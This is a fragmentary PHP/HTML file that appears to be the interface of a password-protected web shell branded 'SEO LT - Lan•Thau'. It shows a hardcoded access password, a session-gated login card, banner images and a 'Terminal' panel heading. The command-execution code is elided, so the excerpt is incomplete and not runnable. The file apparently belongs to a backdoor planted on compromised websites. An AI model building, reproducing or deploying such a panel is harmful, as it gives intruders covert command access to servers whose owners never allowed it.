...
define('PASSWORD', 'emcialan'); // Password untuk kontrol akses
...
if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
    ...
    <div class="login-card">
        <h1>SEO LT - Lan•Thau</h1>
        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhz82vKYZBQFVDpL0I7FbEY4WKdtaXiW-W-SFIoVVDy10Qb3zlcBBp0f3ThU2oNzBFjflnxwHfYLYQp7hXcA8PosgqSM5SZuhxTv4kHl7o5RKIoCjpy_5YoAQ8yvoGUMRMWHYiDBoTRnRzuSGQKVEVeRe26P-FptM9qRlvgkikpDI7Q8mq_ao1wvQkO/s400/seo.png" alt="Banner Image" class="img-fluid">
        <form method="post">
...
<body style="background-color: #414141;">
    <div class="container mt-5">
        ...
        <h1 class="mb-4 text-center">SEO LT - Lan•Thau</h1>
        <div class="text-center mb-4">
            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhxDtVFn-SF1s4wVaCetNck5GXQFDn_V76JALxP63ryew3XUleTi3pQUhbn-KqvPrmjjkuJywfKIHWkTI_oJfQvpQtnQR5Ll_Vr3aOyxKqxfB03mK7EP6HcTKQli2wlPy5swfwW66N1_xi5T2mSjRGRoTDEXONVMHL1sBk8apWNUej-7hxtqnmigJ0B/s800/lan-thau.gif" alt="Welcome Image" class="img-fluid">
        </div>
...
<h2 class="mt-4">Terminal</h2>
        ...
        <footer class="text-center mt-4">
            <small>&copy; <?php echo date("Y"); ?> SEO LT - Lan•Thau</small>
        </footer>
        <?php else: ?>
